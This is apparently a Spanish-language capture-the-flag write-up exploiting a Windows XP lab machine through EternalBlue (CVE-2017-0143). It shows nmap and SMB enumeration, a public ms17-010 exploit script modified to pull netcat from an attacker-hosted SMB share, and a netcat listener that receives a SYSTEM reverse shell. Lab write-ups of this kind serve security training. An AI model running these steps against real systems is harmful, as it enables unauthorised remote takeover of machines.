```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.227.181 -oG allPorts
```

```shell
nmap -p135,139,445 -sCV -vvv 10.129.227.181 -oN targeted 
```

Encontramos los puertos `135`, `139` y `445` abiertos 
Empezaremos listando los recursos compartidos del *SMB* 
```shell
nxc smb 10.129.227.181
```

![[Pasted image 20260915124606.png]]
Vemos que la firma del *SMB* no esta activada al igual que esta *SMBv1* activada, ahora nos iremos con los recursos compartidos
```shell
nxc smb 10.129.227.181 --shares
```

Sin obtener la información ninguna sobre recursos compartidos.
Al ser un *Windows XP* podemos ver la opcion de que se pueda explotar *EternalBlue*, buscaremos un script de [[NMAP]] que nos ayude a identificar si se puede explotar esta vulerabilidad.
Filtrarermos las categorias de [[NMAP]] y usaremos las categorias *vuln* y *safe*
```shell
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u 
```

```shell
nmap -p445 --script "vuln and safe" 10.128.227.181 -oN smbScan
```

Encontramos como resultado que es vulnerable a *CVE-2017-0143* que es un *RCE* en los servicios *SMBv1* también conocido como *EternalBlue*
![[Pasted image 20260915125825.png]]

Utilizaremos un checker para valorar si esta maquina es vulnerable o no
El script lo obtendremos de github [[https://github.com/worawit/ms17-010/]] y una vez clonado en nuestro equipo lo ejecutaremos

```shell
python2 checker.py 10.129.227.181
```
![[Pasted image 20260916101628.png]]

AHora para explotar la vulnerabilidad usaremos el script llamado `zzz_exploit.py` en el cual tendremos que modificar el campo `smb_pwn`
![[Pasted image 20260916102413.png]]

Dejaremos únicamente sin comentar la linea indicada y en ella ejecutaremos un ping para ver si recibimos el ping en nuestra maquina querrá decir que tenemos *RCE*

Ahora nos pondremos en escucha en nuestra maquina atacante
```shell
sudo tcpdump -i tun0
```

Y ejecutaremos el script
```shell
python2 zzz_exploit.py 10.129.227.181
```

Obteneiendo asi como respuesta en nuestro listener los pings realizados desde la maquina Windows, ahora modificaremos el archivo para obtener una *Reverse Shell*, lo que haremos sera publicar un [[NETCAT]] a nivel de red con un servicio *SMB* compartido que la maquina Windows lo obtenga y despues con ese [[NETCAT]] subido se nos ejecute la *Reverse Shell*

Publicaremos el recurso compartido
```shell
smbserver.py smbFolder $(pwd)
```

Modificaremos el script para obtener el archivo y poder ejecutarlo
![[Pasted image 20260916103245.png]]

Y antes de ejecutarlo nos pondremos en escucha con [[NETCAT]]
```Shell
rlwrap nc -nlvp 443
```

Y ejecutaremos el script de nuevo
```Shell
python2 zzz_exploit.py 10.129.227.181 browser
```

Obteneindo acceso como *NTATHORITY SYSTEM* a la maquina victima, pudiendo obtener todas las flags.
En caso de no funcionar se puede usar [[METASPLOIT]]
